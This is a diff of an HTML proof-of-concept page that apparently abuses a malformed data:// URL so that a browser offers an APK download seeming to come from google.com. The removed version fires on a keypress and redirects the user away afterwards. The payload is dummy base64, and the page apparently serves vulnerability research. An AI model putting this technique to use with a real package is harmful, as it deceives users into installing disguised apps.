@@ -2,30 +2,26 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Advanced PoC</title>
+  <title>Malformed Data URL PoC</title>
 </head>
 <body>
 
-<h3>Press any key</h3>
+<h3>Malformed data:// APK PoC</h3>
+<button onclick="go()">Start</button>
 
 <script>
-window.addEventListener('keydown', () => {
-  const base64 = "ZXN0dGVzdGVzdHRlc3Q=";
+function go() {
+  // base64 dummy
+  const base64 = "ZXN0dGVzdGVzdA==";
 
+  // malformed data URL (inti bug)
   const payload = "data://google.com/application/vnd.android.package-archive;base64," + base64;
 
-  const a = document.createElement('a');
-  a.href = payload;
-  a.download = "google.apk";
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
+  // langsung navigate (lebih powerful)
+  location.href = payload;
 
-  // optional redirect biar user pindah halaman
-  setTimeout(() => {
-    location.href = "https://google.com";
-  }, 300);
-});
+  console.log("Trying malformed data:// navigation");
+}
 </script>
 
 </body>
